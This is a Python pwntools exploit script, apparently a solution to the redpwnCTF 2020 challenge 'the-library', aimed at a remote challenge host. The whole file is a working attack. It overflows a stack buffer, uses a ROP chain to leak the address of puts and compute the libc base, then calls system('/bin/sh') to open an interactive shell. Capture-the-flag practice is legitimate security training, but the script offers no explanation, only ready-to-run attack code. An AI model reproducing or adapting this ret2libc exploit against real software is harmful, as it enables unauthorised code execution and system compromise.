from pwn import *

ARCH = 'amd64'
FILE = './the-library'
LIBC = 'libc.so.6'
HOST = '2020.redpwnc.tf'
PORT = 31350

main_address = 0x400637
popret = 0x400733

def exploit(con, elf, libc, rop):
    sys_offset = libc.symbols.system
    puts_offset = libc.symbols.puts
    gets_offset = libc.symbols.gets
    
    puts_got = elf.got.puts
    puts_plt = elf.plt.puts

    padding = 24
    payload = b'A' * padding
    payload += p64(popret)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main_address)

    log.info(f'Payload: {payload}')
    
    con.readline()
    con.sendline(payload)
    con.readline('Hello there:')
    con.recvuntil('\n')

    leak = con.recvuntil('\n').strip()
    puts_address = u64(leak.ljust(8, b"\0"))

    log.info(f'Leaked address   : {hex(puts_address)}')
        
    libc_address = puts_address - puts_offset
    sys_address = libc_address + sys_offset
    log.info(f'Libc address     : {hex(libc_address)}')
    log.info(f'System addrss    : {hex(sys_address)}')

    sh_offset = next(libc.search(b'/bin/sh\x00'))
    sh_address = libc_address + sh_offset
    log.info(f'/bin/sh          : {hex(sh_address)}')

    payload = b'A' * padding
    payload += p64(popret+1)
    payload += p64(popret)
    payload += p64(sh_address)
    payload += p64(sys_address)

    log.success('Spawning a shell')

    con.recvuntil('\n')
    con.sendline(payload)

def main():
    context(arch=ARCH, os='linux')

    if args['REMOTE']:
        con = remote(HOST, PORT)
    elif args['GDB']:
        context.log_level = 'DEBUG'
        con = gdb.debug(FILE, 'b main')
    else:
        con = process([FILE])

    elf = ELF(FILE)

    if LIBC != '':
        libc = ELF(LIBC)
    else:
        libc = ''

    rop = ROP([libc,elf])

    exploit(con, elf, libc, rop)
    con.interactive()

if __name__ == '__main__':
    main()
